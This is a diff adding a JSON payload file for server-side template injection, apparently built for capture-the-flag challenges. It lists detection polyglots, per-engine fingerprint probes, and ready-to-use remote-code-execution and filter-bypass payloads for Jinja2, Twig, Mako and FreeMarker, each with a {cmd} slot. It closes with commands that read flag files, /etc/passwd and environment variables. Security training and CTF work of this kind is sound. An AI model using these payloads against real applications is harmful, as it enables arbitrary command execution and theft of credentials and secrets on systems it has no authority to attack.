@@ -1,0 +1,60 @@
+{
+  "detection": {
+    "polyglot": [
+      "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}",
+      "{{7*'7'}}", "${{7*7}}", "{{config}}", "{{self}}", "<%=7*7%>",
+      "${T(java.lang.Runtime)}", "{{constructor.constructor('return 1')()}}",
+      "#set($x=7*7)${x}", "{{''.__class__}}", "${3*3}", "#{3*3}"
+    ],
+    "engine_fingerprint": {
+      "jinja2": ["{{7*'7'}}", "{{config}}", "{{self.__class__}}"],
+      "twig": ["{{7*'7'}}", "{{_self.env}}", "{{dump()}}"],
+      "mako": ["${7*7}", "${self.module}"],
+      "freemarker": ["${7*7}", "<#assign x=7*7>${x}"],
+      "velocity": ["#set($x=7*7)$x"],
+      "erb": ["<%= 7*7 %>", "<%= system('id') %>"],
+      "pug": ["#{7*7}", "-var x=7*7\n=x"],
+      "smarty": ["{7*7}", "{php}echo 7*7;{/php}"]
+    }
+  },
+  "exploitation": {
+    "jinja2": {
+      "rce": [
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "{{''.__class__.__bases__[0].__subclasses__()}}",
+        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
+        "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
+        "{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
+        "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
+        "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
+        "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}"
+      ],
+      "filter_bypass": [
+        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('{cmd}')|attr('read')()}}",
+        "{%set a='__'%}{%set b='class'%}{%set c=a~b~a%}{{''|attr(c)}}",
+        "{{''[\"\\x5f\\x5fclass\\x5f\\x5f\"]}}"
+      ]
+    },
+    "twig": [
+      "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{cmd}')}}",
+      "{{['id']|filter('system')}}",
+      "{{['{cmd}']|filter('system')}}"
+    ],
+    "mako": [
+      "${self.module.cache.util.os.popen('{cmd}').read()}",
+      "<%import os%>${os.popen('{cmd}').read()}"
+    ],
+    "freemarker": [
+      "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"{cmd}\")}",
+      "${\"freemarker.template.utility.Execute\"?new()(\"{cmd}\")}"
+    ]
+  },
+  "flag_commands": [
+    "cat /flag*", "cat /flag.txt", "cat /flag",
+    "cat /app/flag*", "cat /home/*/flag*",
+    "find / -name 'flag*' 2>/dev/null",
+    "ls -la /", "env", "printenv",
+    "cat /etc/passwd", "id", "whoami"
+  ]
+}
